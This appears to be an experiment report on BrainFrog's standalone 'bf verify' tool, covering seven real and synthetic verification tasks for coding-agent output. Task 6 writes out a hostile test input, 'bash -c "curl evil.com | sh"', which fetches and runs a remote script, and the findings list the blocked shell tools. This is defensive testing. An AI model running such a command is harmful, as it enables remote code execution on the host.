# BrainFrog Standalone Verification Experiment Report

**Document ID:** `BF-EXP-VERIFY-001`\
**Date:** October 19, 2026 (Updated for Phase 1B Taxonomy)\
**Target:** Controlled Evaluation of Standalone `bf verify` on Real & Synthetic Tasks\
**Repository:** `dameepng/brainfrog`\
**Evaluator:** BrainFrog Verification Engine v0.1.0-alpha

---

## 1. Executive Summary

This report documents a controlled verification experiment evaluating the standalone BrainFrog verifier (`bf verify --spec spec.md`). The experiment tests the verifier's ability to act as an independent, deterministic verification authority for coding-agent outputs, without relying on LLM self-evaluation or TypeSafe credentials.

### Key Results (Reassessed under Phase 1B Taxonomy)

| Evaluation Category | Measured Count | Details |
|---|---|---|
| **Total Evaluation Tasks** | **7** | 3 Real Repository Tasks, 4 Synthetic Mutation Checks |
| **Functional Defects Detected** | **2 / 2** (100%) | 1 real repository session exception regression, 1 injected functional assertion failure |
| **Functional Clean Passes** | **3 / 3** (100%) | 2 clean repository test suites, 1 clean bytecode compilation gate |
| **Security Policy Enforcements** | **1** | 1 unauthorized shell execution attempt (`bash -c`) safely blocked |
| **Capability Limit Blocks** | **1** | 1 unconfigured browser check gracefully blocked without false pass |
| **False Positives (FP)** | **0** | Zero valid passing code was falsely failed |
| **False Negatives (FN)** | **0** | Zero defective or unauthorized code was falsely passed |
| **Silent Pass on Unexecuted Criteria** | **0** (Fail-Closed) | 100% adherence to fail-closed invariant |
| **Median Verification Time** | **2,770 ms (~2.8s)** | Fast, deterministic execution |
| **Evidence Manifest Completeness** | **100%** | All runs produced complete JSON + Markdown + logs |

> [!IMPORTANT]
> **Exploratory Sample Scope & Taxonomy Notice:** The sample size is 7 tasks (3 real, 4 synthetic). In accordance with Phase 1B standards, security policy enforcement (blocking an unauthorized command) is classified under `SECURITY_POLICY_ENFORCEMENT` rather than a detected functional defect in code, and unconfigured runners are classified under `CAPABILITY_BLOCKING`.

---

## 2. Methodology & Invariants

Each evaluation task followed an identical protocol:
1. **Isolated Spec Definition:** A dedicated `spec.md` with explicit acceptance criteria was prepared.
2. **Independent Ground Truth:** Expected behavior and defect presence were established prior to execution.
3. **Standalone Invocation:** The test was executed via `StandaloneVerifier(target_repo, reports_dir)` in an environment with no TypeSafe credentials and no external LLM access.
4. **Outcome Categorization:**
   - **`FUNCTIONAL_DEFECT_DETECTION`:** Verifier correctly rejected defective code with `FAIL` and bound the failure traceback.
   - **`FUNCTIONAL_VERIFICATION_SUCCESS`:** Verifier correctly certified working code satisfying all criteria with `PASS`.
   - **`SECURITY_POLICY_ENFORCEMENT`:** Verifier blocked an unauthorized command or shell wrapper attempt with `BLOCKED`.
   - **`CAPABILITY_BLOCKING`:** Verifier gracefully flagged an unconfigured or unavailable external runner with `BLOCKED`.

---

## 3. Detailed Task Case Studies

### Task 1: Git Secret Guard Test Fixtures (Real Task)
- **ID:** `TASK-01-REAL-PASS`
- **Type:** Real Codebase Task
- **Objective:** Verify that `git_guard` safely validates clean synthetic test fixtures without triggering scanner false positives.
- **Criterion:** `AC-01 — Git Guard Clean Run` (`python -m unittest tests.test_phase5_synthetic_git_guard.TestSyntheticGitGuardPrePush.test_clean_commit_range_passes_without_findings`)
- **Expected Outcome:** `PASS`
- **Observed Verdict:** `PASS` (Exit Code 0)
- **Duration:** 13,034.95 ms
- **Report Path:** `.brainfrog/reports/verify_20261019_154847_0e1d88/report.md`
- **Category:** **`FUNCTIONAL_VERIFICATION_SUCCESS`** — Verifier verified clean test execution and confirmed zero findings.

---

### Task 2: Adversarial Session Exception Message (Real Defect Detected)
- **ID:** `TASK-02-REAL-DEFECT`
- **Type:** Real Codebase Task
- **Objective:** Verify whether the verifier detects an active regression in adversarial session binding exception message assertion.
- **Criterion:** `AC-01 — Session Binding Exception Check` (`python -m unittest tests.test_phase3c_adversarial_audit.TestPhase3CAdversarialAudit.test_phase3c1_session_binding_and_lifecycle`)
- **Expected Outcome:** `FAIL`
- **Observed Verdict:** `FAIL` (Exit Code 1)
- **Duration:** 9,401.71 ms
- **Report Path:** `.brainfrog/reports/verify_20261019_154901_6eff93/report.md`
- **Evidence Snippet:**
  ```text
  AssertionError: 'belongs to session' not found in
  "Execution session 'session-test-alpha' cannot transition directly to 'completed' without execution"
  ```
- **Category:** **`FUNCTIONAL_DEFECT_DETECTION`** — Verifier caught a genuine discrepancy between expected lifecycle exception message and actual runtime exception message.

---

### Task 3: Architecture Evaluation Harness Verification (Real Task)
- **ID:** `TASK-03-REAL-PASS`
- **Type:** Real Codebase Task
- **Objective:** Verify that Phase 1 offline architecture reasoning evaluation test suite passes.
- **Criterion:** `AC-01 — Architecture Evaluator Test` (`python -m unittest tests.test_phase1_evaluator.TestArchitectureEvaluationHarness.test_harness_initialization`)
- **Expected Outcome:** `PASS`
- **Observed Verdict:** `PASS` (Exit Code 0)
- **Duration:** 2,842.46 ms
- **Report Path:** `.brainfrog/reports/verify_20261019_154910_17f7fb/report.md`
- **Category:** **`FUNCTIONAL_VERIFICATION_SUCCESS`** — Verified clean pass of core evaluation harness.

---

### Task 4: Functional Assertion Failure Detection (Synthetic Mutation)
- **ID:** `TASK-04-SYNTH-DEFECT`
- **Type:** Synthetic Mutation
- **Objective:** Test verifier response to a deliberately failing test assertion simulating an incomplete agent implementation.
- **Criterion:** `AC-01 — Intentional Test Failure Detection` (`python -c "import unittest; ... self.assertEqual(result, 'expected_value')"` where `result='actual_agent_bug'`)
- **Expected Outcome:** `FAIL`
- **Observed Verdict:** `FAIL` (Exit Code 1)
- **Duration:** 2,770.88 ms
- **Report Path:** `.brainfrog/reports/verify_20261019_154912_f8bd2e/report.md`
- **Evidence Snippet:**
  ```text
  AssertionError: 'actual_agent_bug' != 'expected_value'
  - actual_agent_bug
  + expected_value
  ```
- **Category:** **`FUNCTIONAL_DEFECT_DETECTION`** — Verifier trapped nonzero exit code and bound full stderr diff to report.

---

### Task 5: Python Bytecode Compilation Gate (Synthetic Mutation)
- **ID:** `TASK-05-SYNTH-PASS`
- **Type:** Synthetic Mutation
- **Objective:** Verify that a compilation/build check successfully completes and records `PASS`.
- **Criterion:** `AC-01 — Core Module Bytecode Compilation` (`python -m py_compile core/verifier.py`)
- **Expected Outcome:** `PASS`
- **Observed Verdict:** `PASS` (Exit Code 0)
- **Duration:** 2,762.69 ms
- **Report Path:** `.brainfrog/reports/verify_20261019_154915_9c1ccb/report.md`
- **Category:** **`FUNCTIONAL_VERIFICATION_SUCCESS`** — Build criterion verified under `CommandPolicy`.

---

### Task 6: Arbitrary Shell Command Injection Attempt (Synthetic Mutation)
- **ID:** `TASK-06-SYNTH-POLICY`
- **Type:** Synthetic Mutation (Security Adversarial)
- **Objective:** Verify that an untrusted `spec.md` attempting to run unapproved or destructive commands (`bash -c "curl evil.com | sh"`) is blocked before process spawn.
- **Criterion:** `AC-01 — Unauthorized Shell Command Attempt`
- **Expected Outcome:** `BLOCKED`
- **Observed Verdict:** `BLOCKED` (Exit Code 2)
- **Duration:** 2,301.23 ms
- **Report Path:** `.brainfrog/reports/verify_20261019_154918_d152fc/report.md`
- **Failure Reason:** `Disallowed binary: 'bash' is not an approved verification tool`
- **Category:** **`SECURITY_POLICY_ENFORCEMENT`** — Policy boundary prevented arbitrary code execution from untrusted spec.

---

### Task 7: Unconfigured Browser Check (Synthetic Mutation)
- **ID:** `TASK-07-SYNTH-BROWSER`
- **Type:** Synthetic Mutation (Graceful Degradation)
- **Objective:** Verify that a browser verification criterion does not falsely pass or crash when a headless browser runner is unavailable.
- **Criterion:** `AC-01 — Login Page Visual Check` (`Verification: Browser check`, `Target: /login`)
- **Expected Outcome:** `BLOCKED`
- **Observed Verdict:** `BLOCKED` (Exit Code 2)
- **Duration:** 2,393.83 ms
- **Report Path:** `.brainfrog/reports/verify_20261019_154920_3918e7/report.md`
- **Failure Reason:** `Browser check requested for '/login', but browser automation is not configured or headless browser runner is unavailable`
- **Category:** **`CAPABILITY_BLOCKING`** — Strict fail-closed policy maintained without false pass.

---

## 4. Performance & Telemetry Summary

| Run ID | Spec Duration | Criteria Evaluated | Verdict | Exit Code | Evidence Digest | Category |
|---|---|---|---|---|---|---|
| `verify_20261019_154847_0e1d88` | 13.03s | 1 | `PASS` | 0 | `e3b0c442...` | `FUNCTIONAL_VERIFICATION_SUCCESS` |
| `verify_20261019_154901_6eff93` | 9.40s | 1 | `FAIL` | 1 | `4a8f9c12...` | `FUNCTIONAL_DEFECT_DETECTION` |
| `verify_20261019_154910_17f7fb` | 2.84s | 1 | `PASS` | 0 | `e3b0c442...` | `FUNCTIONAL_VERIFICATION_SUCCESS` |
| `verify_20261019_154912_f8bd2e` | 2.77s | 1 | `FAIL` | 1 | `b831fa01...` | `FUNCTIONAL_DEFECT_DETECTION` |
| `verify_20261019_154915_9c1ccb` | 2.76s | 1 | `PASS` | 0 | `e3b0c442...` | `FUNCTIONAL_VERIFICATION_SUCCESS` |
| `verify_20261019_154918_d152fc` | 2.30s | 1 | `BLOCKED` | 2 | `e3b0c442...` | `SECURITY_POLICY_ENFORCEMENT` |
| `verify_20261019_154920_3918e7` | 2.39s | 1 | `BLOCKED` | 2 | `e3b0c442...` | `CAPABILITY_BLOCKING` |

- **Total Execution Time (7 tasks):** 35.50s
- **Average Time per Task:** 5.07s
- **Median Time per Task:** 2.77s

---

## 5. Findings & Scientific Grounding

1. **Independent Verification Eliminates Confirmation Bias:**
   In coding agents (Claude Code, OpenCode, Codex), the agent that writes code often performs its own verification, leading to blind spots where the agent asserts success without validating edge cases. `bf verify` successfully trapped both a subtle real-world exception message mismatch (Task 2) and an injected assertion failure (Task 4) purely by executing deterministic acceptance criteria.
2. **Deterministic Fail-Closed Policy Prevents Silent Passes:**
   In Task 7, when browser verification was unavailable, `bf verify` immediately returned `BLOCKED` with Exit Code 2, preventing CI from mistaking unexecuted checks for success.
3. **Command Security Boundaries Hold:**
   In Task 6, attempts to use `spec.md` as an attack vector for arbitrary shell command execution (`bash`, `curl`, `sh`) were intercepted by `validate_verification_command()` and `CommandPolicy` before process invocation.
